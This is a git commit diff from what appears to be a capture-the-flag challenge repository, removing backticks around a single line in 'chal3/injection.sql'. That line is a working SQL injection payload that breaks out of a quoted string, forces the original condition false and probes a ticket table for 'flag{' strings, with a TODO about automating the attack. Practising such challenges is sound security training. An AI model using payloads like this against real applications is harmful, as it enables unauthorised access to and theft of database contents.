5fe44f76cdd83ac6f499e95a5f52fc17713fff95
Arvid Persson <58560927+arvid-persson1@users.noreply.github.com>
2025-10-06 00:52:49 +0200

    removed backticks

--- chal3/injection.sql
+++ chal3/injection.sql
@@ -1,2 +1,2 @@
 -- TODO: automate entire process.
-`' AND 0 = 1 OR EXISTS (SELECT 0 FROM ticket WHERE ticket.user = user.name AND (header LIKE '%flag{%}%' OR description LIKE '%flag{%}%'))--`
+' AND 0 = 1 OR EXISTS (SELECT 0 FROM ticket WHERE ticket.user = user.name AND (header LIKE '%flag{%}%' OR description LIKE '%flag{%}%'))--
